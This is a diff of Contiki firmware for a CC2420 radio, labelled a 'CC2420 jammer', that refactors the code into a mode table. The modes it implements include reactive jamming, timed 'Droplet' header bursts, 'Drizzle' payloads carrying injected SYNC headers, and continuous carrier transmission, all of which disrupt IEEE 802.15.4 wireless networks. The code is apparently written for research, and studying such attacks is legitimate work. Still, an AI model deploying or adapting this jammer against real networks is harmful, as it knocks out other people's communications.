@@ -63,25 +63,6 @@
 #define PRINTF(...)
 #endif
 
-// Field Vector (FV) generator macro based on user defined MSB and LSB
-#define FV(MSB, LSB) \
-	(((0x0001<<(MSB - LSB +1)) - 1) << LSB) // 2 ^ nbits - 1, then left shift
-
-// Field value (FVAL) generator macro
-#define FVAL(REGVAL, MSB, LSB) \
-	((REGVAL & FV(MSB, LSB)) >> LSB)
-
-// Set Field macro
-#define SETFD(REGVAL, FVAL, MSB, LSB) \
-	((REGVAL & ~FV(MSB, LSB)) | (FVAL << LSB))
-
-#define FDS(FVAL, LSB) \
-	((FVAL) << (LSB))
-
-// Set Fields
-#define SETFDS(REGVAL, FV, FDS)	\
-	((REGVAL & ~FV) | (FDS))
-
 #define BUSYWAIT_UNTIL(cond, max_time)                                  \
   do {                                                                  \
     rtimer_clock_t t0;                                                  \
@@ -89,26 +70,8 @@
     while(!(cond) && RTIMER_CLOCK_LT(RTIMER_NOW(), t0 + (max_time)));   \
   } while(0)
 
-#define AUTOACK (1 << 4)
-#define ADR_DECODE (1 << 11)
-#define CCAMUX_BV (31<<0)
-#define SFDMUX_BV (31<<5)
-#define AUTOCRC (1<<5)
-
-#define FIFOP_THR_MSB 6
-#define FIFOP_THR_LSB 0
-
 #define CHANNEL 20
 #define TXPOWER_LEVEL 7
-
-#define RX_MODE_BV (3<<0)
-#define RX_MODE_1 (1<<0)
-#define RX_MODE_2 (2<<0)
-#define RX_MODE_3 (3<<0)
-#define TX_MODE_BV (3<<2)
-#define TX_MODE_1 (1<<2) // Tx mode 1: serial mode
-#define TX_MODE_2 (2<<2)
-#define TX_MODE_3 (3<<2)
 
 #define TX_INTERVAL (CLOCK_SECOND / 32)
 #define MAX_TX_PACKETS 10
@@ -117,6 +80,22 @@
 /* "SFD gap" = 298 us out of 4395 us Droplet interval => actual free air time = 298 - 160 (preamble+SFD) = 138 us => free bandwidth = 138/4395 = 3.1% */
 /* #define DEFAULT_RTIMER_INTERVAL (RTIMER_SECOND / 128) */
 #define RTIMER_INTERVAL ((RTIMER_SECOND + (225/2)) / 225 )
+
+#define AUTOACK (1 << 4)
+#define ADR_DECODE (1 << 11)
+#define CCAMUX_BV (31<<0)
+#define SFDMUX_BV (31<<5)
+#define AUTOCRC (1<<5)
+#define FIFOP_THR_MSB 6
+#define FIFOP_THR_LSB 0
+#define RX_MODE_BV (3<<0)
+#define RX_MODE_1 (1<<0)
+#define RX_MODE_2 (2<<0)
+#define RX_MODE_3 (3<<0)
+#define TX_MODE_BV (3<<2)
+#define TX_MODE_1 (1<<2) // Tx mode 1: serial mode
+#define TX_MODE_2 (2<<2)
+#define TX_MODE_3 (3<<2)
 
 extern int jam_ena;
 extern const uint8_t jam_data[6];
@@ -130,13 +109,13 @@ rtimer_clock_t rtimer_interval = RTIMER_INTERVAL;
 struct etimer et;
 struct rtimer rt;
 uint16_t seqno;
-/* static uint8_t hex_seq[] = {127, 1, 0x00, 0xA7}; // No. zero preamble nimbles should be equal or greater than target network's SYNWORD setting. */
-uint8_t hex_seq[] = {7, 1, 0x00, 0xA7}; // short length 
+static uint8_t hex_seq[] = {127, 1, 0x00, 0xA7}; // No. zero preamble nimbles should be equal or greater than target network's SYNWORD setting.
+/* uint8_t hex_seq[] = {7, 1, 0x00, 0xA7}; // short length  */
 // TODO: command to alternate preamble len in hex_seq: 0x0, 0x00, 0x000
 static uint8_t txfifo_data[128];
 
 const unsigned char tx_power_level[10] = {0,1,3,7,11,15,19,23,27,31};
-const struct variable user_variable_list[] = {
+struct variable const user_variable_list[] = {
 	{'l', (union number*)&len_hdr, sizeof(len_hdr), "len_hdr", 0, 127},
 	{'t', (union number*)&tx_interval, sizeof(tx_interval), "tx_interval", 0, (unsigned)~0},
 	{'r', (union number*)&rtimer_interval, sizeof(rtimer_interval), "rtimer_interval", 0, (unsigned)~0},
@@ -150,7 +129,8 @@ PROCESS(test_process, "CC2420 jammer");
 AUTOSTART_PROCESSES(&test_process);
 
 /*---------------------------------------------------------------------------*/
-void pad(uint8_t* dst, size_t dst_len, uint8_t* src, size_t src_len, void (*update_src)(uint8_t *src))
+static void
+pad(uint8_t* dst, size_t dst_len, uint8_t* src, size_t src_len, void (*update_src)(uint8_t *src))
 {
 	int i;
 	for(i = 0;i < dst_len - dst_len % src_len;i+=src_len) {
@@ -163,6 +143,7 @@ void pad(uint8_t* dst, size_t dst_len, uint8_t* src, size_t src_len, void (*upda
 }
 
 /*---------------------------------------------------------------------------*/
+/* CC2420 Serial TX mode */
 void
 send_len(struct rtimer *t, void *ptr)
 {
@@ -261,7 +242,7 @@ send_carrier(int mode)
 		reg &= ~TX_MODE_BV;
 		reg |= TX_MODE_3;
     setreg(CC2420_MDMCTRL1, reg);
-  } else if(mode == PN) {
+  } else if(mode == DRIZZLE) {
 		reg &= ~TX_MODE_BV;
 		reg |= TX_MODE_2;
     setreg(CC2420_MDMCTRL1, reg);
@@ -275,155 +256,308 @@ inc_first_byte(uint8_t *src)
 	(*(src+1))++;
 }
 /*---------------------------------------------------------------------------*/
+static void
+stop_rtimer(int new_mode)
+{
+	rt.ptr = NULL; 		// stop rtimer
+}
 
-void
-start_mode(int to)
+/*---------------------------------------------------------------------------*/
+static void
+rx_mode(int new_mode)
+{
+	rimestats.llrx = 0;
+	rimestats.badcrc = 0; 
+	rimestats.badsynch = 0; 
+	rimestats.toolong = 0;
+	sum_lqi = 0;
+	sum_rssi = 0;
+
+	CC2420_CLEAR_FIFOP_INT();
+	CC2420_ENABLE_FIFOP_INT();
+	flushrx();
+	strobe(CC2420_SRXON);
+}
+
+static void
+off_mode(int new_mode)
+{
+	strobe(CC2420_SRFOFF);
+}
+
+static void
+cs_mode(int new_mode)
+{
+	strobe(CC2420_SRXON);
+	etimer_set(&et, CLOCK_SECOND / 1);
+}
+
+static void
+unmod_mode(int new_mode)
+{
+	send_carrier(new_mode);
+}
+
+static void
+mod_mode(int new_mode)
+{
+	etimer_set(&et, max_tx_packets * tx_interval + CLOCK_SECOND);
+	send_carrier(new_mode);
+}
+
+static void
+tx_mode(int new_mode)
 {
 	unsigned reg;
-	if(mode == JAM) {
-		jam_ena = 0;
-		CC2420_DISABLE_CCA_INT();
-		CC2420_CLEAR_CCA_INT();
-		// clear any jam data in TX
-		/* flushrx(); */
-		strobe(CC2420_SFLUSHTX);
-		/* // clear buffer */
-		/* packetbuf_clear(); */
-	} else if(mode == TX || mode == MOD || mode == UNMOD || mode == BUF_JAM || mode == PN || mode == TX2) {
-		rt.ptr = NULL; 		// stop rtimer
-	}
-	reset_transmitter();
-  mode = to;
-  switch(mode) {
-  case RX: 
-		// clear RX statistics
-		rimestats.llrx = 0;
-		rimestats.badcrc = 0; 
-		rimestats.badsynch = 0; 
-		rimestats.toolong = 0;
-		sum_lqi = 0;
-		sum_rssi = 0;
+	seqno = 0;
+	/* CC2420_DISABLE_FIFOP_INT(); // disable cc2420 interrupt */
+	/* Turn off automatic packet acknowledgment and address decoding. */
+	reg = getreg(CC2420_MDMCTRL0);
+	reg &= ~(AUTOACK | ADR_DECODE);
+	strobe(CC2420_SRXON);
 
-		CC2420_CLEAR_FIFOP_INT();
-		CC2420_ENABLE_FIFOP_INT();
-		flushrx();
-		strobe(CC2420_SRXON);
-
-    printf("RX mode\n");
-    break;
-
-  case CH:
-		strobe(CC2420_SRXON);
-		etimer_set(&et, CLOCK_SECOND / 1);
-
-    printf("Channel sample mode\n");
-    break;
-
-  case TX:
-		seqno = 0;
-		/* CC2420_DISABLE_FIFOP_INT(); // disable cc2420 interrupt */
-		/* Turn off automatic packet acknowledgment and address decoding. */
-		reg = getreg(CC2420_MDMCTRL0);
-		reg &= ~(AUTOACK | ADR_DECODE);
-		strobe(CC2420_SRXON);
-
-		etimer_set(&et, tx_interval);
-
-		printf("TX mode\n"); 
-		break;
-
-  case TX2:
-		seqno = 0;
-		/* Turn on automatic packet acknowledgment and address decoding. */
-		reg = getreg(CC2420_MDMCTRL0);
-		reg |= AUTOACK | ADR_DECODE;
-		setreg(CC2420_MDMCTRL0, reg);
-		strobe(CC2420_SRXON);
-
-		etimer_set(&et, tx_interval);
-
-		printf("TX2 mode\n"); 
-		break;
-
-  case UNMOD: 
-		send_carrier(mode); 
-
-		printf("Unmodulated carrier mode\n"); 
-		break;
-
-  case MOD: 
-		/* etimer_set(&et, CLOCK_SECOND*30); */
-		etimer_set(&et, max_tx_packets * tx_interval + CLOCK_SECOND);
-		send_carrier(mode); 
-
-		printf("Modulated carrier mode\n"); 
-		break;
-
-  case PN: 
-		pad(txfifo_data, sizeof(txfifo_data), hex_seq, sizeof(hex_seq), inc_first_byte);
-		/* pad(txfifo_data, sizeof(txfifo_data), hex_seq, sizeof(hex_seq), NULL); */
-
-		CC2420_WRITE_FIFO_BUF(txfifo_data, 128);
-		etimer_set(&et, max_tx_packets * tx_interval + CLOCK_SECOND);
-		send_carrier(mode); 
-
-		printf("Pseudo random data mode\n"); 
-		break;
-
-  case OFF:
-		strobe(CC2420_SRFOFF);
-		printf("Radio Off mode\n"); 
-		break;
-
-	case JAM:
-		/* reset_transmitter(); */
-		/* CC2420_DISABLE_FIFOP_INT(); // disable cc2420 "packet data received" interrupt */
-		/* CC2420_CLEAR_FIFOP_INT(); */
-		flushrx();
-#if ENABLE_CCA_INTERRUPT
-		/* CC2420_CLEAR_CCA_INT(); */
-		/* CC2420_ENABLE_CCA_INT(); // enable cc2420 "packet header detected" interrupt */
-#endif
-		jam_ena = 1;
-
-		/* TEST: turn off AUTOCRC in order to send frame headers as normal packets */
-		reg = getreg(CC2420_MDMCTRL0);
-		reg &= ~AUTOCRC;
-		setreg(CC2420_MDMCTRL0, reg);
-
-		/* Raise FIFOP interrupt immediately after the length byte, i.e. the 1st byte into RXFIFO, is received */
-		reg = getreg(CC2420_IOCFG0);
-		setreg(CC2420_IOCFG0, SETFD(reg, 1, FIFOP_THR_MSB, FIFOP_THR_LSB));
-
-		/* Pre-fill TX FIFO for next jam */
-		CC2420_WRITE_FIFO_BUF(&jam_data, sizeof(jam_data));
-
-		strobe(CC2420_SRXON);
-
-		printf("Jam mode\n");
-		PRINTF("CCA interrupt enabled = %s\n", CC2420_CCA_PORT(IE) & BV(CC2420_CCA_PIN) ? "true":"false");
-		PRINTF("CCA inerrtupt on falling edge = %s\n", CC2420_CCA_PORT(IES) & BV(CC2420_CCA_PIN) ? "true":"false");
-
-		break;
-
-	case BUF_JAM:
-		CC2420_DISABLE_FIFOP_INT(); // disable cc2420 interrupt
-		// Test: CCA interrupt might cause extra delay
-		CC2420_DISABLE_CCA_INT();
-		CC2420_CLEAR_CCA_INT();
-
-		etimer_set(&et, max_tx_packets * tx_interval + CLOCK_SECOND / 2);
-		/* Start sending Droplets */
-		// add a small jitter (+/-122 us, assuming RTIMER_SECOND = 32768) around the average interval to randomize phase
-		rtimer_set(&rt, RTIMER_NOW() + rtimer_interval - 4 + (random_rand()%9) , 0, send_len_buf, (void *)1);
-
-    printf("Buffered jamming mode\n");
-		break;
-
-  default:
-		printf("undefined mode: %d\n", to);
-  }
+	etimer_set(&et, tx_interval);
 }
+
+static void
+tx2_mode(int new_mode)
+{
+	unsigned reg;
+	seqno = 0;
+	/* Turn on automatic packet acknowledgment and address decoding. */
+	reg = getreg(CC2420_MDMCTRL0);
+	reg |= AUTOACK | ADR_DECODE;
+	setreg(CC2420_MDMCTRL0, reg);
+	strobe(CC2420_SRXON);
+
+	etimer_set(&et, tx_interval);
+}
+
+static void
+droplet_mode(int new_mode)
+{
+	CC2420_DISABLE_FIFOP_INT(); // disable cc2420 interrupt
+	// Test: CCA interrupt might cause extra delay
+	CC2420_DISABLE_CCA_INT();
+	CC2420_CLEAR_CCA_INT();
+
+	etimer_set(&et, max_tx_packets * tx_interval + CLOCK_SECOND / 2);
+	/* Start sending Droplets */
+	// add a small jitter (+/-122 us, assuming RTIMER_SECOND = 32768) around the average interval to randomize phase
+	rtimer_set(&rt, RTIMER_NOW() + rtimer_interval - 4 + (random_rand()%9) , 0, send_len_buf, (void *)1);
+}
+
+static void
+drizzle_mode(int new_mode)
+{
+	// TEST: send Drizzle with wrong synch header, in order to create attack solely by including sending Droplet headers in the payload
+	setreg(CC2420_SYNCWORD, 0xCD0F);
+	printf("SYNCWORD=%0x02x\n", getreg(CC2420_SYNCWORD));
+
+	pad(txfifo_data, sizeof(txfifo_data), hex_seq, sizeof(hex_seq), inc_first_byte);
+	/* pad(txfifo_data, sizeof(txfifo_data), hex_seq, sizeof(hex_seq), NULL); */
+
+	CC2420_WRITE_FIFO_BUF(txfifo_data, 128);
+	etimer_set(&et, max_tx_packets * tx_interval + CLOCK_SECOND);
+	send_carrier(mode);
+ }
+
+/* Reactive jamming */
+static void
+jam_mode(int new_mode)
+{
+	unsigned reg;
+	jam_ena = 0;
+	CC2420_DISABLE_CCA_INT();
+	CC2420_CLEAR_CCA_INT();
+	// clear any jam data in TX
+	strobe(CC2420_SFLUSHTX);
+	/* // clear buffer */
+	/* packetbuf_clear(); */
+	/* CC2420_DISABLE_FIFOP_INT(); // disable cc2420 "packet data received" interrupt */
+	/* CC2420_CLEAR_FIFOP_INT(); */
+	flushrx();
+#if ENABLE_CCA_INTERRUPT
+	/* CC2420_CLEAR_CCA_INT(); */
+	/* CC2420_ENABLE_CCA_INT(); // enable cc2420 "packet header detected" interrupt */
+#endif
+	jam_ena = 1;
+
+	/* TEST: turn off AUTOCRC in order to send frame headers as normal packets */
+	reg = getreg(CC2420_MDMCTRL0);
+	reg &= ~AUTOCRC;
+	setreg(CC2420_MDMCTRL0, reg);
+
+	/* Raise FIFOP interrupt immediately after the length byte, i.e. the 1st byte into RXFIFO, is received */
+	reg = getreg(CC2420_IOCFG0);
+	setreg(CC2420_IOCFG0, SETFD(reg, 1, FIFOP_THR_MSB, FIFOP_THR_LSB));
+
+	/* Pre-fill TX FIFO for next jam */
+	CC2420_WRITE_FIFO_BUF(&jam_data, sizeof(jam_data));
+
+	strobe(CC2420_SRXON);
+
+	PRINTF("CCA interrupt enabled = %s\n", CC2420_CCA_PORT(IE) & BV(CC2420_CCA_PIN) ? "true":"false");
+	PRINTF("CCA inerrtupt on falling edge = %s\n", CC2420_CCA_PORT(IES) & BV(CC2420_CCA_PIN) ? "true":"false");
+}
+
+static void
+tx_eth(void)
+{
+	int i;
+	int errno;
+	uint16_t buf[127/2+1];
+	uint8_t *buf_ptr = (uint8_t *)buf;
+
+	if(seqno < max_tx_packets) {
+		etimer_set(&et, tx_interval / 2 + random_rand() % tx_interval);
+
+		/* int i; */
+		/* for(i = 0;i < payload_len;++i) { */
+		/* 	buf_ptr[i] = (uint8_t)random_rand(); */
+		/* } */
+		/* snprintf((char *)buf, sizeof(buf), "%u", seqno); */
+
+		/* Test: fill payload with SYNC header */
+#define REVERSE_PHASE(octet)	( ((((octet>>4)+8)%16)<<4) + ((octet&0x0f)+8)%16 )
+#define MOD_MODE_BIT 4
+#define MOD_MODE_BV (1<<MOD_MODE_BIT)
+		uint8_t sync_hdr[] = {0x00, 0xA7, 0x7F}; // RP: 0x88, 0x2F, 0xF7
+		// In case in RP mode, reverse SYNC header back to normal mode
+		if (getreg(CC2420_MDMCTRL1) & MOD_MODE_BV) {
+			for (i = 0;i < sizeof(sync_hdr);i++) {
+				sync_hdr[i] = REVERSE_PHASE(sync_hdr[i]);
+			}
+		};
+		memcpy(buf_ptr+payload_len-sizeof(sync_hdr), &sync_hdr[0], sizeof(sync_hdr));
+		/* pad(buf_ptr, payload_len, sync_hdr, sizeof(sync_hdr), NULL); */ // pad payload with SYNC headers
+		snprintf((char *)buf, sizeof(buf), "%u", seqno);
+
+		errno = cc2420_driver.send(buf, payload_len);
+		if (errno == RADIO_TX_OK) printf(". ");
+		else printf("cc2420_send error: %d\n", errno);
+		++seqno;
+	} else {
+		etimer_stop(&et);
+		printf("Finished sending %u packets\n", seqno);
+	}
+}
+
+static void
+tx2_eth(void)
+{
+	int i;
+	int errno;
+	uint16_t buf[127/2+1];
+	uint8_t *buf_ptr = (uint8_t *)buf;
+
+	if(seqno < max_tx_packets) {
+		etimer_set(&et, tx_interval / 2 + random_rand() % tx_interval);
+
+#define MHR_LEN 7 // 16-bit FCF + 8-bit SEQ + 16-bit PAN + 16-bit DST
+		// FCF: frame type Data, ack req = 1, dst add mode = 2, frame ver = 1 src add mode = 0
+		buf[0] = 0x01<<0 | 0<<3 | 0<<4 | 1<<5 | 0<<6 | 0x0<<7 | 2<<10 | 1<<12 | 0<<14;
+		buf_ptr[2] = (uint8_t)seqno % 0xFF;
+		buf_ptr[3] = 0xFF;
+		buf_ptr[4] = 0xFF;
+		buf_ptr[5] = 0x12; // dest. rimeaddr lower byte
+		buf_ptr[6] = 0x02; // dest. rimeaddr higher byte
+		for(i = MHR_LEN;i < payload_len;++i) {
+			buf_ptr[i] = (uint8_t)random_rand();
+		}
+		/* snprintf((char *)buf, sizeof(buf), "%u", seqno); */
+
+		errno = cc2420_driver.send(buf, payload_len);
+		if (errno == RADIO_TX_OK) printf(". ");
+		else	printf("cc2420_send error: %d\n", errno);
+		++seqno;
+	} else {
+		etimer_stop(&et);
+		printf("Finished sending %u packets\n", seqno);
+	}
+}
+static void
+cs_eth(void)
+{
+	int rssi = -127;
+	unsigned lna = 0;
+	/* BUSYWAIT_UNTIL(status() & BV(CC2420_RSSI_VALID), RTIMER_SECOND / 100); */
+	if (status() & BV(CC2420_RSSI_VALID)) {
+		rssi = (int)((signed char)getreg(CC2420_RSSI));
+		lna = getreg(CC2420_AGCCTRL) & 0x0003;
+	}
+	printf("rssi = %d, lna = %u\n", rssi, lna);
+}
+
+static void
+attack_eth(void)
+{
+	etimer_stop(&et);
+	rt.ptr = NULL; 		// stop rtimer
+	reset_transmitter();
+	printf("Finished transmission after %lu seconds\n",
+				 (et.timer.interval + CLOCK_SECOND/2) / CLOCK_SECOND);
+}
+
+struct mode {
+	int mode;
+	const char *display;
+	void (*handler)(int mode);
+	void (*prelog)(int mode);
+	void (*prolog)(int mode);
+	void (*et_handler)(void);
+};
+
+const static struct mode mode_list[] = {
+	{RX, "RX", rx_mode, NULL, NULL, NULL},
+	{OFF, "OFF", off_mode, NULL, NULL, NULL},
+	{CH, "Channel sampling", cs_mode, NULL, NULL, cs_eth},
+	{UNMOD, "Unmodulated carrier", unmod_mode, stop_rtimer, NULL, NULL},
+	{MOD, "Modulated carrier", mod_mode, stop_rtimer, NULL, attack_eth},
+	{TX, "TX broadcast", tx_mode, stop_rtimer, NULL, tx_eth},
+	{TX2, "TX unicast", tx2_mode, stop_rtimer, NULL, tx2_eth},
+	{DRIZZLE, "Drizzle", drizzle_mode, stop_rtimer, NULL, attack_eth},
+	{DROPLET, "Droplet", droplet_mode, stop_rtimer, NULL, attack_eth},
+	{JAM, "Reactive jamming", jam_mode, NULL, NULL, NULL},
+	{-1, NULL, NULL, NULL, NULL, NULL}
+};
+
+void
+start_mode(int new_mode)
+{
+	static int last_mode;
+	const struct mode *p;
+	for (p=&mode_list[0];p->handler;p++) {
+		if(p->mode == new_mode) {
+			if(p->prelog) p->prelog(last_mode);
+			reset_transmitter();
+			p->handler(new_mode);
+			last_mode = mode;
+			mode = new_mode;
+			if(p->prolog) p->prolog(mode);
+			printf("%s mode\n", p->display);
+			return;
+		}
+	}
+	printf("Unknown mode\n");
+}
+
+/*-----------------------------------------------------------------------------*/
+/* Etimer timeout handler */
+static void
+et_handler(void)
+{
+	const struct mode *p;
+
+	etimer_reset(&et);
+	for (p=&mode_list[0];p->handler;p++) {
+		if(p->mode == mode) {
+			if (p->et_handler) p->et_handler();
+			else return;
+		}
+	}
+}
+
 /*---------------------------------------------------------------------------*/
 // radio receiver callback
 /* static uint16_t rxbuf[64]; */
@@ -435,10 +569,10 @@ cc2420_set_receiver(void (*f)(const struct radio_driver *));
 PROCESS_THREAD(test_process, ev, data)
 {
 	int i;
-	int errno;
-	const struct radio_driver *d;
-	static uint16_t buf[127/2+1];
-	static uint8_t *buf_ptr = (uint8_t *)buf;
+	/* int errno; */
+	/* const struct radio_driver *d; */
+	/* static uint16_t buf[127/2+1]; */
+	/* static uint8_t *buf_ptr = (uint8_t *)buf; */
 
   PROCESS_BEGIN();
 
@@ -447,10 +581,8 @@ PROCESS_THREAD(test_process, ev, data)
 	// debug prints
 	printf("F_CPU %lu CLOCK_CONF_SECOND %lu RTIMER_CONF_SECOND %u\n", F_CPU, CLOCK_CONF_SECOND, RTIMER_SECOND);
 
-	// pre-fill pseudo random data for TXFIFO
+	/* pre-fill pseudo random data for TXFIFO */
 	pad(txfifo_data, sizeof(txfifo_data), hex_seq, sizeof(hex_seq), inc_first_byte);
-	/* pad(txfifo_data, sizeof(txfifo_data), hex_seq, sizeof(hex_seq), NULL); */
-
 	char dbuf[300];
 	char *dbuf_ptr = dbuf;
 	for(i = 0;i < 128;++i){
@@ -462,7 +594,7 @@ PROCESS_THREAD(test_process, ev, data)
 
 	commands_set_callback(start_mode);
 
-	d = &cc2420_driver;
+	/* d = &cc2420_driver; */
 
 	button_sensor.configure(SENSORS_ACTIVE, 1);
 
@@ -488,7 +620,7 @@ PROCESS_THREAD(test_process, ev, data)
   /* initialize transceiver mode */
   start_mode(0);
 
-	uint16_t reg;
+	unsigned reg;
 	reg = getreg(CC2420_IOCFG0);
 	printf("IOCFG0 = 0x%04x\n", reg);
 	/* set test output signal */
@@ -504,103 +636,8 @@ PROCESS_THREAD(test_process, ev, data)
   while(1) {
     PROCESS_WAIT_EVENT();
     if(ev == PROCESS_EVENT_TIMER && etimer_expired(&et)) {
-			etimer_reset(&et);
-      if(mode == TX) {
-				if(seqno < max_tx_packets) {
-					etimer_set(&et, tx_interval / 2 + random_rand() % tx_interval);
-
-					/* int i; */
-					/* for(i = 0;i < payload_len;++i) { */
-					/* 	buf_ptr[i] = (uint8_t)random_rand(); */
-					/* } */
-					/* snprintf((char *)buf, sizeof(buf), "%u", seqno); */
-
-					/* Test: fill payload with SYNC header */
-#define REVERSE_PHASE(octet)	( ((((octet>>4)+8)%16)<<4) + ((octet&0x0f)+8)%16 )
-#define MOD_MODE_BIT 4
-#define MOD_MODE_BV (1<<MOD_MODE_BIT)
-					uint8_t sync_hdr[] = {0x00, 0xA7, 0x7F}; // RP: 0x88, 0x2F, 0xF7
-					// In case in RP mode, reverse SYNC header back to normal mode
-					if (getreg(CC2420_MDMCTRL1) & MOD_MODE_BV) {
-						for (i = 0;i < sizeof(sync_hdr);i++) {
-							sync_hdr[i] = REVERSE_PHASE(sync_hdr[i]);
-						}
-					};
-					memcpy(buf_ptr+payload_len-sizeof(sync_hdr), &sync_hdr[0], sizeof(sync_hdr));
-					/* pad(buf_ptr, payload_len, sync_hdr, sizeof(sync_hdr), NULL); */ // pad payload with SYNC headers
-					snprintf((char *)buf, sizeof(buf), "%u", seqno);
-
-					errno = d->send(buf, payload_len);
-					if (errno == RADIO_TX_OK) {
-						/* printf("cc2420_send ok: %d bytes\n", sizeof(str)); */
-						/* printf("cc2420_send ok: %s\n", str); */
-						printf(". ");
-					} else {
-						printf("cc2420_send error: %d\n", errno);
-					}
-					++seqno;
-				} else {
-					etimer_stop(&et);
-					printf("Finished sending %u packets\n", seqno);
-				}
-			}	else if(mode == TX2) {
-				if(seqno < max_tx_packets) {
-					etimer_set(&et, tx_interval / 2 + random_rand() % tx_interval);
-
-#define MHR_LEN 7 // 16-bit FCF + 8-bit SEQ + 16-bit PAN + 16-bit DST
-					int i;
-					// FCF: frame type Data, ack req = 1, dst add mode = 2, frame ver = 1 src add mode = 0
-					buf[0] = 0x01<<0 | 0<<3 | 0<<4 | 1<<5 | 0<<6 | 0x0<<7 | 2<<10 | 1<<12 | 0<<14;
-					buf_ptr[2] = (uint8_t)seqno % 0xFF;
-					buf_ptr[3] = 0xFF;
-					buf_ptr[4] = 0xFF;
-					buf_ptr[5] = 0x12; // dest. rimeaddr lower byte
-					buf_ptr[6] = 0x02; // dest. rimeaddr higher byte
-					for(i = MHR_LEN;i < payload_len;++i) {
-						buf_ptr[i] = (uint8_t)random_rand();
-					}
-					/* snprintf((char *)buf, sizeof(buf), "%u", seqno); */
-
-					errno = d->send(buf, payload_len);
-					if (errno == RADIO_TX_OK) {
-						/* printf("cc2420_send ok: %d bytes\n", sizeof(str)); */
-						/* printf("cc2420_send ok: %s\n", str); */
-						printf(". ");
-					} else {
-						printf("cc2420_send error: %d\n", errno);
-					}
-					++seqno;
-				} else {
-					etimer_stop(&et);
-					printf("Finished sending %u packets\n", seqno);
-				}
-      } else if(mode == CH) {
-				int rssi = -127;
-				unsigned lna = 0;
-				/* BUSYWAIT_UNTIL(status() & BV(CC2420_RSSI_VALID), RTIMER_SECOND / 100); */
-				if (status() & BV(CC2420_RSSI_VALID)) {
-					rssi = (int)((signed char)getreg(CC2420_RSSI));
-					lna = getreg(CC2420_AGCCTRL) & 0x0003;
-				}
-				printf("rssi = %d, lna = %u\n", rssi, lna);
-			} else if(mode == MOD || mode == PN || BUF_JAM) {
-				etimer_stop(&et);
-				rt.ptr = NULL; 		// stop rtimer
-				reset_transmitter();
-				printf("Finished transmission after %lu seconds\n",
-							 (et.timer.interval + CLOCK_SECOND/2) / CLOCK_SECOND);
-			}
+			et_handler();
     } else if(ev == serial_line_event_message) {
-			/* char *cmd = (char *)data; */
-      /* if(cmd[0] == '\0') { */
-			/* 	cmd = &last_cmd[0]; */
-			/* } else if(cmd[0] == '~') { */
-			/* 	cmd = &last_last_cmd[0]; */
-			/* } else { */
-			/* 	strncpy(last_last_cmd, last_cmd, sizeof(last_last_cmd)); */
-			/* 	strncpy(last_cmd, cmd, sizeof(last_cmd)); */
-			/* } */
-
 			/* Command handlers */
 			do_command((char *)data);
     } else if(ev == sensors_event && data == &button_sensor) {
